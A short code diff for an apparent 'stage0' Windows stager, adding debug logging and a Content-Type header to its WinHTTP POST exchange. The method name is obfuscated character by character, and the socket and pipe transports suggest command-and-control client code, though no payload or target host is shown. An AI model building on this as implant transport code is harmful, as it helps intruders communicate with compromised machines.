@@ -1,6 +1,9 @@
 #include "stage0.h"
 #include <winhttp.h>
 #include <ws2tcpip.h>
+#ifdef STAGE0_DEBUG
+#include <stdio.h>
+#endif
 
 typedef struct { HINTERNET session, connection; s0_config cfg; } http_state;
 typedef struct { SOCKET socket; HANDLE pipe; s0_config cfg; } stream_state;
@@ -26,7 +29,12 @@ static int http_exchange(s0_transport *t, const uint8_t *in, uint32_t in_len,
     static const wchar_t method[] = {L'P',L'O',L'S',L'T',0};
     r = WinHttpOpenRequest(s->connection, method, s->cfg.path, 0, 0, 0, flags);
     if (!r) return 0;
-    if (!WinHttpSendRequest(r, 0, 0, (void *)in, in_len, in_len, 0) ||
+    #ifdef STAGE0_DEBUG
+    fprintf(stderr, "[stage0] http post length=%lu body=%.*s\n",
+            (unsigned long)in_len, (int)in_len, (const char *)in);
+    #endif
+    if (!WinHttpSendRequest(r, L"Content-Type: text/plain\r\n", (DWORD)-1L,
+                            (void *)in, in_len, in_len, 0) ||
         !WinHttpReceiveResponse(r, 0)) { WinHttpCloseHandle(r); return 0; }
     while (WinHttpQueryDataAvailable(r, &avail) && avail) {
         if (!s0_buffer_reserve(out, out->length + avail) ||
